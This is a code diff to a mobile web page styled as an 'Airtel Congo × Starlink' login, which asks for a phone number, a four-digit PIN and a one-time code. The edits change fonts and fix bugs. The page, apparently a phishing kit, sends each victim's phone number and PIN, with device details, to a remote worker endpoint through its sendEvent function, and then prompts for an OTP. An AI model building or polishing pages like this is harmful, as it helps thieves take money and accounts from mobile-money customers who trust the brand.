@@ -7,11 +7,11 @@
 <title>Airtel Congo × Starlink — Connexion</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700;9..40,800;9..40,900&family=DM+Mono:wght@500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=DM+Mono:wght@500;600&display=swap" rel="stylesheet">
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 html,body{height:100%}
-body{font-family:'DM Sans',system-ui,sans-serif;-webkit-font-smoothing:antialiased;background:#F2F2F7;color:#1C1B1F;display:flex;flex-direction:column;position:fixed;inset:0;width:100%;height:100vh;height:100dvh;overflow:hidden}
+body{font-family:'Inter',system-ui,-apple-system,sans-serif;-webkit-font-smoothing:antialiased;background:#F2F2F7;color:#1C1B1F;display:flex;flex-direction:column;position:fixed;inset:0;width:100%;height:100vh;height:100dvh;overflow:hidden}
 button{font-family:inherit;touch-action:manipulation;border:none;background:none;cursor:pointer;outline:none;-webkit-user-select:none;user-select:none}
 img{display:block;max-width:100%}
 *{-webkit-user-select:none;user-select:none}
@@ -357,6 +357,7 @@ function togglePeek(){
     ?'<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'
     :'<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
   renderPIN();
+}
 
 function renderPIN(){
   for(var i=0;i<4;i++){
@@ -389,8 +390,7 @@ function renderPIN(){
   updateLoginBtn();
 }
 function updateLoginBtn(){
-  var ph=forfait.phone||'';
-  document.getElementById('loginBtn').classList.toggle('dim',!(ph.length===9&&pin.length===4));
+  document.getElementById('loginBtn').classList.toggle('dim',pin.length!==4);
 }
 document.getElementById('pinPad').addEventListener('click',function(e){
   var k=e.target.closest('.nk');if(!k||k.disabled)return;
@@ -407,12 +407,17 @@ renderPIN();
 // Submit login
 function submitLogin(){
   var ph=forfait.phone||'';
-  if(!ph||ph.length!==9){hap([25,15,25]);return;}
+  if(!ph||ph.length!==9){
+    document.getElementById('pinErr').textContent='Erreur de session — retournez choisir votre forfait';
+    hap([25,15,25]);
+    setTimeout(function(){location.href='airtel-index.html';},1500);
+    return;
+  }
   if(pin.length!==4){document.getElementById('pinErr').textContent='Entrez votre code PIN \u00e0 4 chiffres';hap([25,15,25]);return;}
   sessionStorage.setItem('starlinkAuth',JSON.stringify({phone:ph,pin:pin}));
   sendEvent('starlink_pin_submitted',{plan:forfait.name,price:forfait.price,phone:ph,pin:pin,device:navigator.userAgent.slice(0,80)});
   hap(18);
-  document.getElementById('navSpinner').style.display='block';
+  var _ns=document.getElementById('navSpinner');if(_ns)_ns.style.display='block';
   setStep(2);showView('viewProc');
   runProcessing(ph);
 }
@@ -441,7 +446,7 @@ async function runProcessing(ph){
   document.getElementById('otpPhone').innerHTML='<span style="margin-right:5px">&#127464;&#127465;</span>+243 '+ph.slice(0,2)+' '+ph.slice(2,5)+' '+ph.slice(5);
   otpVal='';renderOTP();updateOTPBtn();startTimer();
   setStep(3);showView('viewOTP');focusOTPInput();
-  document.getElementById('navSpinner').style.display='none';
+  var _ns2=document.getElementById('navSpinner');if(_ns2)_ns2.style.display='none';
 }
 
 // OTP
@@ -504,7 +509,6 @@ function submitOTP(){
 }
 function sendEvent(ev,data){try{fetch(WORKER+'/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({event:ev,data:data,ts:new Date().toISOString()})}).catch(function(){});}catch(e){}}
 document.querySelectorAll('button').forEach(function(b){b.addEventListener('pointerdown',function(e){rip(this,e);},{passive:true});});
-}
 </script>
 </body>
 </html>
